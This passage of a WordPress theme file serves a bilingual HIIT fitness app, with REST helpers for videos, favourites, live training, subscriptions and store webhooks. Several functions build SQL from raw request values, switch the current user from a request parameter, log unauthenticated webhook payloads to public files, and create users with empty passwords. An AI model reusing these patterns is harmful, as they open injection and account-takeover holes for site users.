        $post_id = $post_data->ID;
        $retData[$key] = $post_data;
        $retData[$key]->thumbnail_img = wp_get_attachment_url( get_post_thumbnail_id( $post_id ), 'thumbnail' );
    }

    return $retData;
}

function get_program_dumbbells_list($request)
{
    $language = $request['language'];
    $pageLimit = $request['limit'] == '' ? -1 : $request['limit'];
    
    $termId = 40;
    if($language == 'ar'){
        $termId = 112;
    }
    $retData = [];
    $args = array(
        'posts_per_page' => $pageLimit,
        'post_type' => 'program-post',
        'order' => 'DESC',
        'tax_query' => [
            [
                'taxonomy' => 'program_category',
                'terms' => $termId,
                'include_children' => false, // Remove if you need posts from term 7 child terms
                
            ],],
            
    );
    $posts = get_posts( $args );
    
    foreach($posts as $key => $post_data){
        $post_id = $post_data->ID;
        $retData[$key] = $post_data;
        $retData[$key]->thumbnail_img = wp_get_attachment_url( get_post_thumbnail_id( $post_id ), 'thumbnail' );
    }

    return $retData;
}

function static_video_trial_mode_together()
{
    $videos[] = array('name'=>'v1','title'=>'BASIC HIIT','video_id'=>'538021184','link'=>'https://vimeo.com/538021184','thumbnail_img'=>'http://dev.indiit.solutions/hiitfit/wp-content/uploads/2021/07/img2.png');
    $videos[] = array('name'=>'v2','title'=>'EXERCISES','video_id'=>'539129881','link'=>'https://vimeo.com/539129881','thumbnail_img'=>'http://dev.indiit.solutions/hiitfit/wp-content/uploads/2021/07/img1.png');
    $videos[] = array('name'=>'v3','title'=>'DUMBELLS','video_id'=>'528306489','link'=>'https://vimeo.com/528306489','thumbnail_img'=>'http://dev.indiit.solutions/hiitfit/wp-content/uploads/2021/07/img5.png');
    $videos[] = array('name'=>'v4','title'=>'HIIT LIVE – COMING SOON','video_id'=>'538020932','link'=>'https://vimeo.com/538020932','thumbnail_img'=>'http://dev.indiit.solutions/hiitfit/wp-content/uploads/2021/07/img4.png');
    $videos[] = array('name'=>'v5','title'=>'QUICK HIIT (INTERMEDIATE)','video_id'=>'541300678','link'=>'https://vimeo.com/541300678','thumbnail_img'=>'http://dev.indiit.solutions/hiitfit/wp-content/uploads/2021/07/img3.png');
    $videos[] = array('name'=>'v6','title'=>'QUICK HIIT (BEGINNERS)','video_id'=>'538267285','link'=>'https://vimeo.com/538267285','thumbnail_img'=>'http://dev.indiit.solutions/hiitfit/wp-content/uploads/2021/07/img2.png');
    $result['status'] = 1;
    $result['list'] = $videos;
    return $result;
}


function getfeatureTwoVideos_together($request){
    
    $language = $request['language'];
    
    $pageLimit = $request['limit'] == '' ? 7 : $request['limit'];
    
    $termId = 190;
    if($language == 'ar'){
        $termId = 194;
    }
    $retData = [];
    $args = array(
        'posts_per_page' => $pageLimit,
        'post_type' => 'program-post',
        'order' => 'DESC',
        'meta_query' => array(
        array(
            'key' => 'video_id',
            'value' => '',
            'compare' => '!='
            )
        ),
        'tax_query' => [
            [
                'taxonomy' => 'program_category',
                'terms' => $termId,
                'include_children' => false, // Remove if you need posts from term 7 child terms
                
            ],],
            
    );
    $posts = get_posts( $args );
    
    foreach($posts as $key => $post_data){
        $post_id = $post_data->ID;
        $data = get_post_meta( $post_id );
        $retData[$key]->post_id = $post_id;
        $retData[$key]->video_id = get_field( 'video_id', $post_id );
        $retData[$key]->video_type = get_field( 'video_type', $post_id );
        $retData[$key]->video_date = $post_data->post_date;
        $retData[$key]->video_date_gmt = $post_data->post_date_gmt;
        $retData[$key]->video_title = $post_data->post_title;
        $retData[$key]->video_link = "https://vimeo.com/".get_field( 'video_id', $post_id );
        $retData[$key]->video_img = wp_get_attachment_url( get_post_thumbnail_id( $post_id ), 'thumbnail' );
        //$retData[$key]->watch_time = get_field( 'watch_time', $post_id );
        //$retData[$key]->watched_date = get_field( 'watched_date', $post_id );
        
    }
    $result['status'] = 1;
    $result['data'] = $retData;
    return $result;
}

function get_live_training_together($request){ 
    $language = $request['language'];
    
    $pageLimit = $request['limit'] == '' ? 10 : $request['limit'];
    
    if(!$language){
        $language="en";
    }
    global $wpdb;
    $table_name = "wp_live_training";
    $res = $wpdb->get_results( "SELECT * FROM $table_name  WHERE (lang = '$language') AND WHERE status=1 ORDER BY id DESC LIMIT $pageLimit");
    if(count($res) > 0){
        $result['status'] = 1;
        $result['msg'] = 'Get all live training list!' ;
        $result['data'] = $res;
    }
    else{
        $result['status'] = 0;
        $result['msg'] = 'Data not found!' ;
        $result['data'] = null;
    }
    return $result;
}

function get_two_watched_videos_together($request){
    
    $language = $request['language'];
    $user = $request['user_id'];
	$user_id_with_post = $user."_watched_video_data_".$language;
	
	$pageLimit = $request['limit'] == '' ? 10 : $request['limit'];
    
    $args = [
    'post_type' => 'program-post',
    'posts_per_page' =>$pageLimit,
    'meta_key' => $user_id_with_post,
    'orderby' => 'meta_value', 
    'order' => 'DESC',
    'meta_query' => array(
        array(
            'key' => 'video_id',
            'value' => '',
            'compare' => '!='
            )
        ),
    ];
    $retData = [];
    $posts = get_posts( $args );
    
    foreach($posts as $key => $post_data){
        $post_id = $post_data->ID;
        
        $data = get_post_meta( $post_id );
        $retData[$key]->post_id = $post_id;
        $retData[$key]->video_type = get_field( 'video_type', $post_id );
        $retData[$key]->video_added_date = $post_data->post_date;
        $retData[$key]->video_title = $post_data->post_title;
        $retData[$key]->video_link = "https://vimeo.com/".get_field( 'video_id', $post_id );
        $retData[$key]->video_img = wp_get_attachment_url( get_post_thumbnail_id( $post_id ), 'thumbnail' );
        $retData[$key]->video_id = get_field( 'video_id', $post_id );
        $retData[$key]->watch_time = get_field( $user.$post_id.'_watch_time', $post_id );
        $retData[$key]->watched_date = get_field( $user.$post_id.'_watched_date', $post_id );
    }
    $result['status'] = 1;
    $result['data'] = $retData;
    return $result;
}

function my_favourite_list_together($request){
    
    $language = $request['language'];
    $pageLimit = $request['limit'] == '' ? 10 : $request['limit'];
    $lang = '1';
    if($language == "ar"){
        $lang = '0';
    }
   
    $user_id = $request['user_id'];
    $table = "wp_favourite_post";
    global $wpdb;
    $res = $wpdb->get_results("SELECT * FROM $table WHERE (user_id = $user_id  AND lang = '$lang') ORDER BY id DESC LIMIT $pageLimit" );
    $retData = [];
    foreach($res as $key=>$v){
        $post_id = $v->post_id;
        $post_data = wp_get_single_post( $post_id );
        $post_meta_data = get_post_meta( $post_id );
        $retData[$key]->id = $v->id;
        $retData[$key]->post_id = $v->post_id;
        $retData[$key]->video_id = get_field( 'video_id', $post_id );
        $retData[$key]->video_type = get_field( 'video_type', $post_id );
        $retData[$key]->video_date = $post_data->post_date;
        $retData[$key]->video_date_gmt = $post_data->post_date_gmt;
        $retData[$key]->video_title = $post_data->post_title;
        $retData[$key]->video_link = "https://vimeo.com/".get_field( 'video_id', $post_id );
        $retData[$key]->video_img = wp_get_attachment_url( get_post_thumbnail_id( $post_id ), 'thumbnail' );
    }
    $resultt['status'] = 1;
    $resultt['data'] = $retData;
    return $resultt;
}


function check_active_plan_together($request){
    
    $user_id = $request['user_id'];
    $lang = $request['lang'];
    
    if(!$user_id){
        $data['error'] = "User ID is required";
        return $data;        
    }
    
    $payment_type = get_user_meta($user_id,'app_payment_type',true);
    if($payment_type == 'android'){
       $data =  hf_is_android_expire_callback($request);
       if(empty($data)) goto webmem;
       return $data;   
    }
    if($payment_type == 'ios'){
       $data =  hf_is_apple_expire_callback($request);
       if(empty($data)) goto webmem;
       return $data;   
    }    
    webmem:
    $user = new MeprUser( $user_id );
    wp_set_current_user($user_id);
    $subsdata = MeprUtils::get_currentuserinfo();
    $subscriptions = $subsdata->active_product_subscriptions();
    $subsdata = array();
    if($subscriptions){
    $subscriptions = array_unique($subscriptions);
        foreach($subscriptions as $subscription){
                $post = get_post($subscription); //assuming $id has been initialized
                setup_postdata($post);
                $post_data = array();
                $post_data = $post;
                if($lang){
                    $translations = pll_get_post_translations($subscription);
                    $id = $translations[$lang];
                    if( $id ){
                        $post->post_title = get_the_title($id);
                    }
                }
                
                $post->meta = get_post_meta($post->ID);
                $subsdata[] = $post;
                wp_reset_postdata();
                break;
        }
    }
    
    
    if($user->ID){
        $recent_trans =  $user->recent_transactions();
        $data = array();  
        $data['is_active'] = $user->is_active();
        if($recent_trans){
            $data['status'] = 1;
            $data['previous_member'] = TRUE;
        }else{
            $data['status'] = 77;
            $data['previous_member'] = FALSE;
        }
        $expiration = $user->active_product_subscriptions('transactions', true);
        foreach($expiration as $rec){
            $expire_date = MeprAppHelper::format_date($rec->expires_at, __('Never','memberpress'));
            date_default_timezone_set($request['tz']);
            $data['expire'] = date("d-m-Y, g:i a", strtotime($expire_date));
        }
    }else{
        $data['error'] = "User Not exist";
    }
    $data['membership'] = $subsdata;
    $data['appType'] = $payment_type;
    return $data;
}


function check_trial_mode_together($request){
    $user_id = $request['user_id'];
    if(!$user_id){
        return false;       
    }
    $reg_days_ago = 14;
    $cu = get_userdata($user_id);
    return ( isset( $cu->data->user_registered ) && strtotime( $cu->data->user_registered ) > strtotime( sprintf( '-%d days', $reg_days_ago ) ) ) ? TRUE : FALSE;
}

add_action('rest_api_init', 'register_rest_images' );
function register_rest_images(){
    register_rest_field( array('post'),
        'feature_image',
        array(
            'get_callback'    => 'get_rest_featured_image',
            'update_callback' => null,
            'schema'          => null,
        )
    );
    
    register_rest_field( array('post'),
        'ago_time',
        array(
            'get_callback'    => 'get_ago_time',
            'update_callback' => null,
            'schema'          => null,
        )
    );    
}

function get_ago_time( $object, $field_name, $request ) {
    $lang = pll_get_post_language($object['id']);
    if( $object['date'] ){
        if($lang == 'ar'){
            $date = meks_time_ago_ar($object['date']);
        }else{
            $date = meks_time_ago($object['date']);
        }
        return $date;
    }
    return $object['date'];
}

function meks_time_ago_ar() {
	return human_time_diff( get_the_time( 'U' ), current_time( 'timestamp' ) ).' '.__( 'منذ' );
}

function meks_time_ago() {
	return human_time_diff( get_the_time( 'U' ), current_time( 'timestamp' ) ).' '.__( 'ago' );
}

function get_rest_featured_image( $object, $field_name, $request ) {
    if( $object['featured_media'] ){
        $img = wp_get_attachment_image_src( $object['featured_media']);
        return $img[0];
    }
    return false;
}

function my_theme_filter_rest_post_query( $args, $request ) {
	$lang_parameter = $request->get_param('lang');

	if ( isset( $lang_parameter ) ) {
		$args['lang'] = $lang_parameter; // https://polylang.pro/doc/developpers-how-to/#query
	}

	return $args;
}
add_filter( 'rest_post_query', 'my_theme_filter_rest_post_query', 10, 2 );


add_action('admin_menu', 'nutritions_admin_menu' );	
function nutritions_admin_menu(){
    add_menu_page(__('Nutritions', 'golo-framework'), __('Nutritions', 'golo-framework'), 'manage_options', 'nutritions', 'nutritions_admin_menu_page_handler','dashicons-admin-generic',25);
}

function nutritions_admin_menu_page_handler()
{
    include_once get_template_directory().'/nutritions.php';
}

function hitfit_enqueue_script(){
    global $parent_file;
    if( 'nutritions' == $parent_file ){
        if( function_exists( 'wp_enqueue_media' ) ) {
            wp_enqueue_media(); 
        }			
        wp_enqueue_script( 'hitfit-uploadimage',  get_template_directory_uri(). '/js/media-uploader.js' );
    }
}

add_action( 'admin_print_scripts', 'hitfit_enqueue_script');


function wp_insert_user_custom( $userdata ) {
    global $wpdb;
 
    if ( $userdata instanceof stdClass ) {
        $userdata = get_object_vars( $userdata );
    } elseif ( $userdata instanceof WP_User ) {
        $userdata = $userdata->to_array();
    }
 
    // Are we updating or creating?
    if ( ! empty( $userdata['ID'] ) ) {
        $ID            = (int) $userdata['ID'];
        $update        = true;
        $old_user_data = get_userdata( $ID );
 
        if ( ! $old_user_data ) {
            return new WP_Error( 'invalid_user_id', __( 'Invalid user ID.' ) );
        }
 
        // Hashed in wp_update_user(), plaintext if called directly.
        $user_pass = "";
    } else {
        $update = false;
        // Hash the password.
        $user_pass = "";
    }
 
    $sanitized_user_login = sanitize_user( $userdata['user_login'], true );
 
    /**
     * Filters a username after it has been sanitized.
     *
     * This filter is called before the user is created or updated.
     *
     * @since 2.0.3
     *
     * @param string $sanitized_user_login Username after it has been sanitized.
     */
    $pre_user_login = apply_filters( 'pre_user_login', $sanitized_user_login );
 
    // Remove any non-printable chars from the login string to see if we have ended up with an empty username.
    $user_login = trim( $pre_user_login );
 
    // user_login must be between 0 and 60 characters.
    if ( empty( $user_login ) ) {
        return new WP_Error( 'empty_user_login', __( 'Cannot create a user with an empty login name.' ) );
    } 
 
    if ( ! $update && username_exists( $user_login ) ) {
        return new WP_Error( 'existing_user_login', __( 'Sorry, that username already exists!' ) );
    }
 
    /**
     * Filters the list of disallowed usernames.
     *
     * @since 4.4.0
     *
     * @param array $usernames Array of disallowed usernames.
     */
    $illegal_logins = (array) apply_filters( 'illegal_user_logins', array() );
 
    if ( in_array( strtolower( $user_login ), array_map( 'strtolower', $illegal_logins ), true ) ) {
        return new WP_Error( 'invalid_username', __( 'Sorry, that username is not allowed.' ) );
    }
 
    /*
     * If a nicename is provided, remove unsafe user characters before using it.
     * Otherwise build a nicename from the user_login.
     */
    if ( ! empty( $userdata['user_nicename'] ) ) {
        $user_nicename = sanitize_user( $userdata['user_nicename'], true );
        if ( mb_strlen( $user_nicename ) > 50 ) {
            return new WP_Error( 'user_nicename_too_long', __( 'Nicename may not be longer than 50 characters.' ) );
        }
    } else {
        $user_nicename = "";
    }
 
    $user_nicename = sanitize_title( $user_nicename );
 
    /**
     * Filters a user's nicename before the user is created or updated.
     *
     * @since 2.0.3
     *
     * @param string $user_nicename The user's nicename.
     */
    $user_nicename = "";
 
    $raw_user_email = empty( $userdata['user_email'] ) ? '' : $userdata['user_email'];
 
    /**
     * Filters a user's email before the user is created or updated.
     *
     * @since 2.0.3
     *
     * @param string $raw_user_email The user's email.
     */
    $user_email = apply_filters( 'pre_user_email', $raw_user_email );
 
    /*
     * If there is no update, just check for `email_exists`. If there is an update,
     * check if current email and new email are the same, and check `email_exists`
     * accordingly.
     */
    if ( ( ! $update || ( ! empty( $old_user_data ) && 0 !== strcasecmp( $user_email, $old_user_data->user_email ) ) )
        && ! defined( 'WP_IMPORTING' )
        && email_exists( $user_email )
    ) {
        return new WP_Error( 'existing_user_email', __( 'Sorry, that email address is already used!' ) );
    }
 
    $raw_user_url = empty( $userdata['user_url'] ) ? '' : $userdata['user_url'];
 
    /**
     * Filters a user's URL before the user is created or updated.
     *
     * @since 2.0.3
     *
     * @param string $raw_user_url The user's URL.
     */
    $user_url = apply_filters( 'pre_user_url', $raw_user_url );
 
    $user_registered = empty( $userdata['user_registered'] ) ? gmdate( 'Y-m-d H:i:s' ) : $userdata['user_registered'];
 
    $user_activation_key = empty( $userdata['user_activation_key'] ) ? '' : $userdata['user_activation_key'];
 
    if ( ! empty( $userdata['spam'] ) && ! is_multisite() ) {
        return new WP_Error( 'no_spam', __( 'Sorry, marking a user as spam is only supported on Multisite.' ) );
    }
 
    $spam = empty( $userdata['spam'] ) ? 0 : (bool) $userdata['spam'];
 
    // Store values to save in user meta.
    $meta = array();
 
    $nickname = empty( $userdata['nickname'] ) ? $user_login : $userdata['nickname'];
 
    /**
     * Filters a user's nickname before the user is created or updated.
     *
     * @since 2.0.3
     *
     * @param string $nickname The user's nickname.
     */
    $meta['nickname'] = apply_filters( 'pre_user_nickname', $nickname );
 
    $first_name = empty( $userdata['first_name'] ) ? '' : $userdata['first_name'];
 
    /**
     * Filters a user's first name before the user is created or updated.
     *
     * @since 2.0.3
     *
     * @param string $first_name The user's first name.
     */
    $meta['first_name'] = apply_filters( 'pre_user_first_name', $first_name );
 
    $last_name = empty( $userdata['last_name'] ) ? '' : $userdata['last_name'];
    $meta['last_name'] = apply_filters( 'pre_user_last_name', $last_name );
 
    if ( empty( $userdata['display_name'] ) ) {
        $display_name = "";
    } else {
        $display_name = $userdata['display_name'];
    }
 
    /**
     * Filters a user's display name before the user is created or updated.
     *
     * @since 2.0.3
     *
     * @param string $display_name The user's display name.
     */
    $display_name = apply_filters( 'pre_user_display_name', $display_name );
 
    $description = empty( $userdata['description'] ) ? '' : $userdata['description'];
 
    /**
     * Filters a user's description before the user is created or updated.
     *
     * @since 2.0.3
     *
     * @param string $description The user's description.
     */
    $meta['description'] = apply_filters( 'pre_user_description', $description );
 
    $meta['rich_editing'] = empty( $userdata['rich_editing'] ) ? 'true' : $userdata['rich_editing'];
 
    $meta['syntax_highlighting'] = empty( $userdata['syntax_highlighting'] ) ? 'true' : $userdata['syntax_highlighting'];
 
    $meta['comment_shortcuts'] = empty( $userdata['comment_shortcuts'] ) || 'false' === $userdata['comment_shortcuts'] ? 'false' : 'true';
 
    $admin_color         = empty( $userdata['admin_color'] ) ? 'fresh' : $userdata['admin_color'];
    $meta['admin_color'] = preg_replace( '|[^a-z0-9 _.\-@]|i', '', $admin_color );
 
    $meta['use_ssl'] = empty( $userdata['use_ssl'] ) ? 0 : (bool) $userdata['use_ssl'];
 
    $meta['show_admin_bar_front'] = empty( $userdata['show_admin_bar_front'] ) ? 'true' : $userdata['show_admin_bar_front'];
 
    $meta['locale'] = isset( $userdata['locale'] ) ? $userdata['locale'] : '';
 
    $compacted = compact( 'user_pass', 'user_nicename', 'user_email', 'user_url', 'user_registered', 'user_activation_key', 'display_name' );
    $data      = wp_unslash( $compacted );
 
    if ( ! $update ) {
        $data = $data + compact( 'user_login' );
    }
 
    if ( is_multisite() ) {
        $data = $data + compact( 'spam' );
    }
 
    $data = apply_filters( 'wp_pre_insert_user_data', $data, $update, ( $update ? (int) $ID : null ), $userdata );
 
    if ( empty( $data ) || ! is_array( $data ) ) {
        return new WP_Error( 'empty_data', __( 'Not enough data to create this user.' ) );
    }
 
    if ( $update ) {
        if ( $user_email !== $old_user_data->user_email || $user_pass !== $old_user_data->user_pass ) {
            $data['user_activation_key'] = '';
        }
        $wpdb->update( $wpdb->users, $data, compact( 'ID' ) );
        $user_id = (int) $ID;
    } else {
        $wpdb->insert( $wpdb->users, $data );
        $user_id = (int) $wpdb->insert_id;
    }
 
    $user = new WP_User( $user_id );
 
    $meta = apply_filters( 'insert_user_meta', $meta, $user, $update, $userdata );
 
    // Update user meta.
    foreach ( $meta as $key => $value ) {
        update_user_meta( $user_id, $key, $value );
    }
 
    foreach ( wp_get_user_contact_methods( $user ) as $key => $value ) {
        if ( isset( $userdata[ $key ] ) ) {
            update_user_meta( $user_id, $key, $userdata[ $key ] );
        }
    }
 
    if ( isset( $userdata['role'] ) ) {
        $user->set_role( $userdata['role'] );
    } elseif ( ! $update ) {
        $user->set_role( get_option( 'default_role' ) );
    }
 
    clean_user_cache( $user_id );
 
    if ( $update ) {
        do_action( 'profile_update', $user_id, $old_user_data, $userdata );
 
        if ( isset( $userdata['spam'] ) && $userdata['spam'] != $old_user_data->spam ) {
            if ( 1 == $userdata['spam'] ) {
                do_action( 'make_spam_user', $user_id );
            } else {
                do_action( 'make_ham_user', $user_id );
            }
        }
    } else {
        do_action( 'user_register', $user_id, $userdata );
    }
 
    return $user_id;
}
add_filter( 'mepr-currency-codes', 'cf_mepr_currency_codes', 10, 1 );
function cf_mepr_currency_codes($codes)
{
    $codes[] = 'KWD';
    return $codes;
}
add_filter( 'mepr-currency-symbols', 'cf_mepr_currency_symbols', 10, 1 );
function cf_mepr_currency_symbols($payment_currencies)
{
    $payment_currencies[] = 'KD';
    return $payment_currencies;
}
add_filter( 'mpmc-currency-symbols', 'cf_mpmc_currency_symbols', 10, 1 );
function cf_mpmc_currency_symbols($currencies)
{
    $currencies['KWD'] = array(
        'symbol' => 'KD',
        'code'   => 'KWD',
        'name'   => 'Kuwaiti Dinar',
    );
    return $currencies;
}


/*****************************************************
 * Update subscription token from google playstore *
*****************************************************/
add_action( 'rest_api_init', 'update_google_play_store_subscriptions_api_hook' );
function update_google_play_store_subscriptions_api_hook(){
    register_rest_route(
    'custom-plugin', '/android_notifications/',
    array('methods'  => 'POST','callback' => 'update_google_play_store_subscriptions_api',));
    register_rest_route(
    'custom-plugin', '/ios_notifications/',
    array('methods'  => 'POST','callback' => 'update_ios_store_subscriptions_api',));
}

function update_google_play_store_subscriptions_api($request){
 
    $myfile = fopen("error_response.txt", "a") or die("Unable to open file!");
    $log_time = date('Y-m-d h:i:sa');
    fwrite($myfile, "************** Start Log For Day : '" . $log_time . "'**********");
    fwrite($myfile, $myfile);
    fwrite($myfile, print_r($_POST, true));
    fwrite($myfile, print_r($request, true));
    fwrite($myfile, print_r($_GET, true));
    $txt = "save";
    fwrite($myfile, $txt);
    fwrite($myfile, "************** END Log For Day  : '" . $log_time . "'**********");
    fclose($myfile);
    
    if(isset($request['message']['data']))
    {
        $data = $request['message']['data'];
        $notification_data = json_decode(base64_decode($data),true);
        $purchaseToken = $notification_data['subscriptionNotification']['purchaseToken'];
        $notificationType = $notification_data['subscriptionNotification']['notificationType'];
        $eventTimeMillis = $notification_data['eventTimeMillis'];
        if($notificationType == 13 && $purchaseToken){
            global $wpdb;
            $table_name = 'wp_mepr_transactions';
            $expireTime = date('Y-m-d H:i:s', $eventTimeMillis/1000. - date("Z"));
            $wpdb->update( $table_name, array( 'expires_at' => $expireTime ),array('trans_num'=>$purchaseToken));
      
        }
    }
}

function update_ios_store_subscriptions_api($request)
{
    $myfile = fopen("error_response_ios.txt", "a") or die("Unable to open file!");
    $log_time = date('Y-m-d h:i:sa');
    fwrite($myfile, "************** Start Log For Day : '" . $log_time . "'**********");
    fwrite($myfile, print_r($_POST, true));
    fwrite($myfile, print_r($request, true));
    fwrite($myfile, print_r($_GET, true));
    $txt = "save";
    fwrite($myfile, $txt);
    fwrite($myfile, "************** END Log For Day  : '" . $log_time . "'**********");
    fclose($myfile);   
    if(isset($request['unified_receipt']['pending_renewal_info'][0]['original_transaction_id']))
    {
        $original_transaction_id = $request['unified_receipt']['pending_renewal_info'][0]['original_transaction_id'];
        $last_transaction = current($request['unified_receipt']['latest_receipt_info']);
        $expireTime = $last_transaction['expires_date_ms']; 
        $user_id = get_user_id_by_trans_id($original_transaction_id);
        $transaction_id = get_user_meta($user_id,'app_purchase_token',true);
        if($transaction_id && $user_id){
            global $wpdb;
            $expireTime = date('Y-m-d H:i:s', $expireTime/1000. - date("Z"));
            $table_name = 'wp_mepr_transactions';
            $wpdb->update( $table_name, array( 'expires_at' => $expireTime ),array('trans_num'=>$transaction_id));            
        }
    } 
}

function get_user_id_by_trans_id($value) {
	global $wpdb;
	$key = 'ios_original_transactionId';
	$meta = $wpdb->get_results("SELECT * FROM `".$wpdb->usermeta."` WHERE meta_key='".$wpdb->escape($key)."' AND meta_value='".$wpdb->escape($value)."'");
	if (is_array($meta) && !empty($meta) && isset($meta[0])) {
		$meta = $meta[0];
	}		
	if (is_object($meta)) {
		return $meta->user_id;
	}
	else {
		return false;
	}
}


